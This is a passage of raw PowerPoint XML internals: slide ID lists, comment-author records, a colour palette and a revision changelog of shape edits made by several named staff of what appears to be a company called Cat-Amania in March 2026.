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 id="2147483701" r:id="rId5"/>
    <p:sldMasterId id="2147483705" r:id="rId6"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId r:id="rId17"/>
  </p:notesMasterIdLst>
  <p:handoutMasterIdLst>
    <p:handoutMasterId r:id="rId18"/>
  </p:handoutMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="2147308243" r:id="rId7"/>
    <p:sldId id="2147308312" r:id="rId8"/>
    <p:sldId id="2147308306" r:id="rId9"/>
    <p:sldId id="2147308307" r:id="rId10"/>
    <p:sldId id="2147308308" r:id="rId11"/>
    <p:sldId id="2147308310" r:id="rId12"/>
    <p:sldId id="2147308309" r:id="rId13"/>
    <p:sldId id="2147308301" r:id="rId14"/>
    <p:sldId id="2147308300" r:id="rId15"/>
    <p:sldId id="2147308302" r:id="rId16"/>
  </p:sldIdLst>
  <p:sldSz cx="12192000" cy="6858000"/>
  <p:notesSz cx="6797675" cy="987425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F6CA33-D5C8-C291-AAD1-761E124D81FD}" name="Cyrille SALMON" initials="CS" userId="S::c.salmon@catamania.com::595b1b32-b778-4620-8bcf-9299807977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ary MORISSON" initials="GM" lastIdx="12" clrIdx="0">
    <p:extLst>
      <p:ext uri="{19B8F6BF-5375-455C-9EA6-DF929625EA0E}">
        <p15:presenceInfo xmlns:p15="http://schemas.microsoft.com/office/powerpoint/2012/main" userId="S-1-5-21-256186190-2593113423-711547814-2270" providerId="AD"/>
      </p:ext>
    </p:extLst>
  </p:cmAuthor>
  <p:cmAuthor id="2" name="f.marchand" initials="f" lastIdx="1" clrIdx="1">
    <p:extLst>
      <p:ext uri="{19B8F6BF-5375-455C-9EA6-DF929625EA0E}">
        <p15:presenceInfo xmlns:p15="http://schemas.microsoft.com/office/powerpoint/2012/main" userId="f.marchand" providerId="None"/>
      </p:ext>
    </p:extLst>
  </p:cmAuthor>
  <p:cmAuthor id="3" name="Anne-Edythe LARREUR" initials="AL" lastIdx="2" clrIdx="2">
    <p:extLst>
      <p:ext uri="{19B8F6BF-5375-455C-9EA6-DF929625EA0E}">
        <p15:presenceInfo xmlns:p15="http://schemas.microsoft.com/office/powerpoint/2012/main" userId="S::ae.larreur@cat-amania.com::74e32d5b-32dd-43c6-868c-c3d45443e863" providerId="AD"/>
      </p:ext>
    </p:extLst>
  </p:cmAuthor>
  <p:cmAuthor id="4" name="Valentin POMMIER" initials="VP" lastIdx="1" clrIdx="3">
    <p:extLst>
      <p:ext uri="{19B8F6BF-5375-455C-9EA6-DF929625EA0E}">
        <p15:presenceInfo xmlns:p15="http://schemas.microsoft.com/office/powerpoint/2012/main" userId="S::v.pommier@cat-amania.com::053da332-4c2b-4c52-bef8-938f78adad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9100"/>
    <a:srgbClr val="DFE1DF"/>
    <a:srgbClr val="AEB4B2"/>
    <a:srgbClr val="F5F5F5"/>
    <a:srgbClr val="E9EBEA"/>
    <a:srgbClr val="F2F3F1"/>
    <a:srgbClr val="E6E8E4"/>
    <a:srgbClr val="C6CBC2"/>
    <a:srgbClr val="95D476"/>
    <a:srgbClr val="73C64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3F9C48-C9DF-4E9C-8AF8-DAEF82A96B72}" v="320" dt="2026-03-16T17:15:05.82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65" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="33" d="100"/>
          <a:sy n="33" d="100"/>
        </p:scale>
        <p:origin x="989"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MONTUY" userId="444e698c-97f5-4f2a-8b58-f585d86c9534" providerId="ADAL" clId="{76070BD6-E488-42C8-8269-ED8B29E584B7}"/>
    <pc:docChg chg="custSel modSld sldOrd">
      <pc:chgData name="Sarah MONTUY" userId="444e698c-97f5-4f2a-8b58-f585d86c9534" providerId="ADAL" clId="{76070BD6-E488-42C8-8269-ED8B29E584B7}" dt="2026-03-04T16:44:45.692" v="7" actId="1076"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="addSp delSp modSp mod ord">
        <pc:chgData name="Sarah MONTUY" userId="444e698c-97f5-4f2a-8b58-f585d86c9534" providerId="ADAL" clId="{76070BD6-E488-42C8-8269-ED8B29E584B7}" dt="2026-03-04T16:44:45.692" v="7" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2114327657" sldId="2147308288"/>
        </pc:sldMkLst>
        <pc:picChg chg="add mod">
          <ac:chgData name="Sarah MONTUY" userId="444e698c-97f5-4f2a-8b58-f585d86c9534" providerId="ADAL" clId="{76070BD6-E488-42C8-8269-ED8B29E584B7}" dt="2026-03-04T16:44:45.692" v="7" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2114327657" sldId="2147308288"/>
            <ac:picMk id="38" creationId="{5C14B654-F0DE-07EC-2741-8938C6D8796D}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="Patricia LEBRUN" userId="S::p.lebrun@catamania.com::0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="AD" clId="Web-{CC0B3496-EA1A-83E4-2179-DDAAB9C3E96E}"/>
    <pc:docChg chg="modSld">
      <pc:chgData name="Patricia LEBRUN" userId="S::p.lebrun@catamania.com::0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="AD" clId="Web-{CC0B3496-EA1A-83E4-2179-DDAAB9C3E96E}" dt="2026-03-06T14:57:14.763" v="20" actId="14100"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="addSp delSp modSp">
        <pc:chgData name="Patricia LEBRUN" userId="S::p.lebrun@catamania.com::0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="AD" clId="Web-{CC0B3496-EA1A-83E4-2179-DDAAB9C3E96E}" dt="2026-03-06T14:57:14.763" v="20" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4048713828" sldId="313"/>
        </pc:sldMkLst>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="S::p.lebrun@catamania.com::0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="AD" clId="Web-{CC0B3496-EA1A-83E4-2179-DDAAB9C3E96E}" dt="2026-03-06T14:54:17.765" v="4" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4048713828" sldId="313"/>
            <ac:picMk id="14" creationId="{FF3ED27B-7DAC-5C44-8AA0-0BBFD899C5BF}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="S::p.lebrun@catamania.com::0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="AD" clId="Web-{CC0B3496-EA1A-83E4-2179-DDAAB9C3E96E}" dt="2026-03-06T14:54:55.295" v="7" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4048713828" sldId="313"/>
            <ac:picMk id="18" creationId="{D66B4802-6FC0-8C93-4A48-AF30CF407076}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="S::p.lebrun@catamania.com::0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="AD" clId="Web-{CC0B3496-EA1A-83E4-2179-DDAAB9C3E96E}" dt="2026-03-06T14:57:14.763" v="20" actId="14100"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4048713828" sldId="313"/>
            <ac:picMk id="30" creationId="{12E8174C-8C8A-9A03-D004-8A87A9FE54E2}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}"/>
    <pc:docChg chg="undo redo custSel addSld modSld sldOrd">
      <pc:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:15:05.825" v="1410" actId="20577"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="addSp delSp modSp mod">
        <pc:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:15:00.833" v="1043"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4292474606" sldId="306"/>
        </pc:sldMkLst>
        <pc:spChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:15:00.833" v="1043"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4292474606" sldId="306"/>
            <ac:spMk id="5" creationId="{EEC0F5E5-C6A9-DCC9-16B6-5E828B54B239}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:15:00.833" v="1043"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4292474606" sldId="306"/>
            <ac:spMk id="13" creationId="{D828530F-1045-32C6-7EAC-6E4277B2913C}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-02T15:15:38.575" v="1016" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4292474606" sldId="306"/>
            <ac:spMk id="26" creationId="{ABE83D56-542A-933B-A3D4-8A44831EA29A}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp mod">
        <pc:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T15:56:05.108" v="1018" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1345604441" sldId="309"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T15:56:05.108" v="1018" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1345604441" sldId="309"/>
            <ac:spMk id="24" creationId="{83141258-90A7-CEE8-6631-73AAA9FD8D5E}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp mod">
        <pc:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:02:20.491" v="1038"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3114296258" sldId="310"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T15:57:20.025" v="1020" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="2" creationId="{EDFC7F9A-BA4A-E3BD-03C8-126F8733689E}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T15:57:20.025" v="1020" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="9" creationId="{DA396469-A898-FAFA-03E0-4075D8294C2E}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T15:57:20.025" v="1020" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="10" creationId="{8B3CB3C2-541E-4EC9-07A0-65380579D4AF}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T15:57:20.025" v="1020" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="11" creationId="{F39C3070-AF6F-8989-A6D8-A4A71D74C506}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T15:57:20.025" v="1020" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="12" creationId="{101B2D8A-B2C5-94A8-E9E3-F7CE5EC3DA56}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T15:57:20.025" v="1020" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="17" creationId="{A9025C1D-9A01-EB85-D28C-B4B160E4C204}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:02:20.085" v="1037" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="22" creationId="{EBFB598B-97F8-C71F-7666-5358140E4EB6}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T15:56:01.240" v="1017" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="24" creationId="{AB81781F-4932-CFB5-91C4-ED9DD412B77A}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T15:57:14.824" v="1019" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="29" creationId="{738D4689-B5BC-182B-8B2E-10952608092D}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:02:20.085" v="1037" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="30" creationId="{63B10CE5-FD1F-A8B7-67A7-2FE342D7E8B0}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T15:57:14.824" v="1019" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="31" creationId="{60CF4AFA-0145-5955-C701-D37C5880A886}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:02:20.085" v="1037" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="32" creationId="{F2F95553-F775-7DF0-702B-4CDA26A18C1F}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:02:20.491" v="1038"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="33" creationId="{84788DF5-8B02-4A14-152C-98DCF0FF7383}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:02:20.491" v="1038"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="34" creationId="{49A03163-A083-585E-3C6A-87D94AF282A1}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:02:20.491" v="1038"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="35" creationId="{1B83A6F1-FEF0-40A5-584A-E2BC2F07132A}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:02:20.491" v="1038"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="36" creationId="{5E5B0E78-6883-A0CC-3F73-2A1C338F9C04}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:02:20.085" v="1037" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="39" creationId="{83474F5E-A5FF-8F9A-9397-2E20B147EAA8}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:02:20.085" v="1037" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="40" creationId="{DCE1F9BA-85AA-C4EA-9EA1-445DEAF01B58}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:02:20.085" v="1037" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="41" creationId="{2C888D2D-0D41-276C-AE48-8485F1CCEAE9}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:02:20.085" v="1037" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="42" creationId="{C7C9E48D-D9DC-F864-3CFE-2FC5EFE64385}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T15:57:20.025" v="1020" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="46" creationId="{10C333DD-828B-7EBF-4627-DEB95BF602AA}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T15:57:20.025" v="1020" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="48" creationId="{7B87EC89-0097-E340-6B9A-B497E31454D2}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:02:20.491" v="1038"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="53" creationId="{230118F7-2B03-C333-2322-4D90265D85C3}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:02:20.491" v="1038"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="54" creationId="{5749D11A-851D-14F8-D39F-15B59ECBA0CD}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:02:20.491" v="1038"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="59" creationId="{29CD771E-8034-F38A-6C31-2DD702CD2B6F}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:02:20.491" v="1038"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="62" creationId="{27303ADE-8ACC-BD27-0182-1C18B2E8EA6F}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:02:20.491" v="1038"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="98" creationId="{DD6391DE-DC85-312A-2CDE-7829EBF99261}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:02:20.491" v="1038"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:spMk id="101" creationId="{A4DA0D18-CA8A-13B4-5517-D9753752127B}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:02:20.085" v="1037" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:picMk id="63" creationId="{6E43ECB3-4474-D39A-8B9C-DDFB8FC5AA06}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:02:20.085" v="1037" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:picMk id="71" creationId="{1D64CC4B-57EF-F394-E06A-DFC8FA2A2600}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:02:20.085" v="1037" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3114296258" sldId="310"/>
            <ac:picMk id="73" creationId="{7044C006-2710-FB6D-E654-66E917E03B96}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp mod">
        <pc:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:22:52.884" v="1060" actId="1035"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1607779612" sldId="312"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod topLvl">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:22:52.884" v="1060" actId="1035"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1607779612" sldId="312"/>
            <ac:spMk id="11" creationId="{643F516D-6CF6-173A-FE5C-621800DBF617}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:22:52.884" v="1060" actId="1035"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1607779612" sldId="312"/>
            <ac:spMk id="31" creationId="{6DDEC9CA-7C56-544C-B387-327753726C9B}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:22:52.884" v="1060" actId="1035"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1607779612" sldId="312"/>
            <ac:spMk id="32" creationId="{222352BD-A612-F7A3-1B27-72F9A74913E3}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:22:52.884" v="1060" actId="1035"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1607779612" sldId="312"/>
